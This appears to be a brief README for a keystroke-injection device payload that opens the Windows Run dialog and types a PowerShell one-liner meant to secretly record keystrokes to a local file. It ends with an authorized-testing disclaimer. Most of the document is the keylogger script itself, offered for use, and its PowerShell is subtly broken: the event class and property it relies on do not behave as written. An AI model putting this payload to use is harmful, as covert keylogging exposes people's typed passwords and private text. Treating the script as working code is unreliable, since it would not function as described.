# Capture Keystrokes

Captures local keystrokes and saves them to a file using PowerShell.

```
DELAY 500
GUI r
DELAY 200
STRING powershell -Command "$keystrokes = @(); Register-WmiEvent -Class Win32_Keyboard -Action { $keystrokes += $EventArgs.PressedKey; if($keystrokes.Count -ge 10) { $keystrokes | Out-File C:\\keystrokes.txt } }"
ENTER
```

> Disclaimer: This script is for educational purposes and should only be used in environments where you have explicit authorization to perform penetration testing. Always follow ethical guidelines and laws governing cybersecurity practices.